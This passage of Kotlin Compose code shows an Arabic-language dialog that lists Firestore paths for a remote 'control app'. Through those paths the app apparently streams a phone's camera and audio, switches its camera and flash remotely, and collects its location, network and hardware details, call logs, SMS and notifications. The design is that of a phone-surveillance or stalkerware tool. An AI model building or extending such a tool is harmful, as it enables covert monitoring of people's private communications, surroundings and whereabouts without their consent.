        AlertDialog(
            onDismissRequest = { showArchitecturePlan = false },
            title = {
                Text("📋 خطة التحكم عبر تطبيق @", fontWeight = FontWeight.Bold)
            },
            text = {
                Column(modifier = Modifier.verticalScroll(rememberScrollState())) {
                    Text(
                        text = "هذه هي مسارات Firestore الدقيقة التي يمكنك ربط تطبيق التحكم @ بها مباشرة:\n\n" +
                                "1️⃣ بث الكاميرا والصوت:\n" +
                                "• المسار: streams/$userName\n" +
                                "• الحقول: frame (صورة Base64), audio (صوت Base64), facing (front/back), timestamp\n\n" +
                                "2️⃣ تبديل الكاميرا والفلاش عن بعد:\n" +
                                "• المسار: settings/$userName\n" +
                                "• لتغيير الكاميرا: اكتب cameraFacing: 'front' أو 'back'\n" +
                                "• لتشغيل الفلاش: اكتب torch: true أو false\n\n" +
                                "3️⃣ معلومات الجهاز ومكونات الهاردوير وشبكة الـ WiFi:\n" +
                                "• المسار: devices/$userName\n" +
                                "• يحتوي على: wifiSsid, wifiSpeedMbps, localIp, batteryLevel, isCharging, totalRam, availableRam, totalInternalStorage, model, manufacturer, googleMapsUrl (الموقع الجغرافي)\n\n" +
                                "4️⃣ سجلات المكالمات:\n" +
                                "• المسار: calls/$userName/logs\n\n" +
                                "5️⃣ سجلات الرسائل SMS:\n" +
                                "• المسار: sms/$userName/logs\n\n" +
                                "6️⃣ سجلات الإشعارات الواردة:\n" +
                                "• المسار: notifications/$userName/logs",
                        style = MaterialTheme.typography.bodySmall
                    )
                }
            },
            confirmButton = {
                Button(onClick = { showArchitecturePlan = false }) {
                    Text("تم الفهم")
                }
            }
        )
    }
}

